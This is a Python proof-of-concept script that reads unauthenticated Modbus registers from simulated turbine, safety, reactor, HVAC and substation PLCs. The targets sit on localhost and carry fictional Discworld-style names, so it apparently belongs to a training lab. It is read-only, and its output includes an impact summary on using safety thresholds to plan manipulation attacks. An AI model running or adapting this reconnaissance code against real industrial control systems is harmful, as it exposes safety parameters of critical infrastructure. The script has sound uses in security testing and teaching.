#!/usr/bin/env python3
"""
Proof of concept: Unauthorised reading of turbine control parameters
This demonstrates that an attacker could read sensitive operational data
including setpoints, alarms, and safety limits from the turbine PLCs.

NOTE: This is a READ-ONLY demonstration. No values are modified.
"""

from pymodbus.client import ModbusTcpClient
import json
from datetime import datetime


def read_turbine_config(plc_ip, port, unit_id):
    """Read turbine configuration without modifying anything"""

    client = ModbusTcpClient(plc_ip, port=port)

    if not client.connect():
        print(f"    [!] Failed to connect to {plc_ip}:{port}")
        return None

    config = {}

    # Speed setpoint (register 1000)
    result = client.read_holding_registers(address=1000, count=1)
    if not result.isError():
        config['speed_setpoint_rpm'] = result.registers[0]
    else:
        config['speed_setpoint_rpm'] = None

    # Temperature alarm threshold (register 1050)
    result = client.read_holding_registers(address=1050, count=1)
    if not result.isError():
        config['temp_alarm_threshold_c'] = result.registers[0]
    else:
        config['temp_alarm_threshold_c'] = None

    # Emergency stop status (register 1100)
    result = client.read_holding_registers(address=1100, count=1)
    if not result.isError():
        config['emergency_stop_active'] = bool(result.registers[0])
    else:
        config['emergency_stop_active'] = None

    # Read input registers for current operational values
    result = client.read_input_registers(address=2000, count=1)
    if not result.isError():
        config['current_speed_rpm'] = result.registers[0]
    else:
        config['current_speed_rpm'] = None

    result = client.read_input_registers(address=2050, count=1)
    if not result.isError():
        config['current_temperature_c'] = result.registers[0]
    else:
        config['current_temperature_c'] = None

    # Additional safety parameters
    result = client.read_holding_registers(address=1200, count=1)
    if not result.isError():
        config['vibration_threshold'] = result.registers[0]
    else:
        config['vibration_threshold'] = None

    # Pressure limits
    result = client.read_holding_registers(address=1300, count=1)
    if not result.isError():
        config['pressure_limit_psi'] = result.registers[0]
    else:
        config['pressure_limit_psi'] = None

    # Power output setpoint
    result = client.read_holding_registers(address=1400, count=1)
    if not result.isError():
        config['power_output_setpoint_kw'] = result.registers[0]
    else:
        config['power_output_setpoint_kw'] = None

    # Generator frequency
    result = client.read_input_registers(address=2100, count=1)
    if not result.isError():
        config['generator_frequency_hz'] = result.registers[0]
    else:
        config['generator_frequency_hz'] = None

    # Oil pressure
    result = client.read_input_registers(address=2150, count=1)
    if not result.isError():
        config['oil_pressure_psi'] = result.registers[0]
    else:
        config['oil_pressure_psi'] = None

    # Bearing temperature
    result = client.read_input_registers(address=2200, count=1)
    if not result.isError():
        config['bearing_temperature_c'] = result.registers[0]
    else:
        config['bearing_temperature_c'] = None

    client.close()

    return config


def demonstrate_impact():
    """Show what an attacker could learn from this access"""

    print("=" * 70)
    print("[*] Proof of Concept: Unauthorised Turbine Configuration Access")
    print("[*] This is a READ-ONLY demonstration")
    print("=" * 70 + "\n")

    # Control system targets
    targets = [
        # Device: hex_turbine_plc, Type: turbine_plc, Description: Hex Steam Turbine Controller (Allen-Bradley ControlLogix 1998)
        ('127.0.0.1', 10502, 'Hex Steam Turbine PLC'),

        # Device: hex_turbine_safety_plc, Type: turbine_safety_plc, Description: Turbine Safety Instrumented System
        ('127.0.0.1', 10503, 'Hex Turbine Safety PLC'),

        # Device: reactor_plc, Type: reactor_plc, Description: Alchemical Reactor Controller (Siemens S7-400 2003)
        ('127.0.0.1', 10504, 'Alchemical Reactor PLC'),

        # Device: library_hvac_plc, Type: hvac_plc, Description: Library Environmental Controller (Schneider Modicon 1987 + Gateway)
        ('127.0.0.1', 10505, 'Library HVAC PLC'),

        # Device: library_lspace_monitor, Type: specialty_controller, Description: L-Space Dimensional Stability Monitor
        ('127.0.0.1', 10506, 'Library L-Space Monitor'),

        # Device: substation_rtu_1, Type: substation_rtu, Description: Main Substation RTU - Unseen University Campus
        ('127.0.0.1', 10510, 'Main Substation RTU'),

        # Device: scada_server_primary, Type: scada_server, Description: Primary SCADA Server (Wonderware System Platform)
        ('127.0.0.1', 10520, 'Primary SCADA Server')
    ]

    results = {}
    successful_reads = 0

    for ip, port, name in targets:
        print(f"[*] Reading configuration from {name} ({ip}:{port})...")
        config = read_turbine_config(ip, port, 1)

        if config:
            results[name] = config
            successful_reads += 1

            print(f"    Speed Setpoint: {config['speed_setpoint_rpm']} RPM")
            print(f"    Current Speed: {config['current_speed_rpm']} RPM")
            print(f"    Temperature Alarm: {config['temp_alarm_threshold_c']}°C")
            print(f"    Current Temperature: {config['current_temperature_c']}°C")
            print(f"    E-Stop Active: {config['emergency_stop_active']}")
            print(f"    Vibration Threshold: {config['vibration_threshold']}")
            print(f"    Pressure Limit: {config['pressure_limit_psi']} PSI")
            print(f"    Power Setpoint: {config['power_output_setpoint_kw']} KW")
            print(f"    Generator Frequency: {config['generator_frequency_hz']} Hz")
            print(f"    Oil Pressure: {config['oil_pressure_psi']} PSI")
            print(f"    Bearing Temperature: {config['bearing_temperature_c']}°C")

            # Calculate operational margin
            if config['current_temperature_c'] and config['temp_alarm_threshold_c']:
                margin = config['temp_alarm_threshold_c'] - config['current_temperature_c']
                print(f"    Temperature Safety Margin: {margin}°C")
            print()
        else:
            print(f"    [!] Could not read from {name}\n")

    if successful_reads == 0:
        print("[!] No control systems were accessible.")
        return

    # Save results with timestamp
    output = {
        'timestamp': datetime.now().isoformat(),
        'demonstration': 'read_only_turbine_access',
        'systems_scanned': len(targets),
        'successful_reads': successful_reads,
        'systems': results,
        'impact_assessment': {
            'data_exposure': [
                'Operational setpoints and safety thresholds exposed',
                'Real-time operational state visible to unauthorized parties',
                'Safety margins and alarm thresholds revealed',
                'System architecture and register mapping discovered'
            ],
            'attack_enablement': [
                'Attacker could monitor operational states in real-time',
                'Configuration data reveals safety margins and operational limits',
                'Historical data collection could reveal production schedules',
                'Information enables planning of precise manipulation attacks',
                'Baseline establishment allows detection of anomalies attackers create'
            ],
            'business_impact': [
                'Intellectual property theft (operational parameters)',
                'Competitive intelligence (production efficiency)',
                'Safety information leakage enables targeted attacks',
                'Regulatory compliance violations (unauthorized access)'
            ]
        }
    }

    filename = f'poc_turbine_read_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    with open(filename, 'w') as f:
        json.dump(output, f, indent=2)

    print("[*] " + "=" * 66)
    print(f"[*] Results saved to {filename}")
    print("[*] No modifications were made to any systems")
    print("[*] This demonstrates read-only reconnaissance capability")
    print("[*] " + "=" * 66)

    print("\n[*] IMPACT SUMMARY:")
    print("-" * 70)
    print("    An attacker with this access could:")
    print("    • Monitor real-time operational state")
    print("    • Map system architecture and register layout")
    print("    • Identify safety thresholds to stay below during attacks")
    print("    • Collect baseline data for anomaly detection evasion")
    print("    • Plan precisely-timed manipulation attacks")
    print("    • Steal proprietary operational parameters")


if __name__ == '__main__':
    try:
        demonstrate_impact()
    except KeyboardInterrupt:
        print("\n[*] Demonstration interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during demonstration: {e}")